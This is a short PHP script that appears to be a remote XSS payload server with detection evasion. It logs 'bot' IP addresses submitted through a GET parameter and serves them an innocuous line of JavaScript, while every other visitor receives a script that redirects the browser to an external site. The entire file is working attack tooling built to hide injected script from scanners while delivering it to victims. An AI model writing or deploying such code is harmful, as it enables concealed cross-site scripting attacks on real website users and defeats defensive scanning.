<?php

$xssPayload = "window.location.href=\"https://github.com/TheKingOfDuck\";";
$db = "botIPs.txt";

$ip = $_SERVER["REMOTE_ADDR"];
$botIP = @$_GET['ip'];

if (!is_null($botIP)){
	$bots = fopen($db, "a") or die("Unable to open bots file!");
	fwrite($bots, base64_encode($botIP) . "\n");
	fclose($bots);
	
}else{

	if (file_exists($db)) {
		$line = file_get_contents($db);
		$botIPs = explode("\n", $line);
	}

	if (@in_array(base64_encode($ip), $botIPs)) {
		header('Content-type: text/javascript');
		echo "var hb;";
	}else {
		header('Content-type: text/javascript');
		echo $xssPayload;
	}
}
?>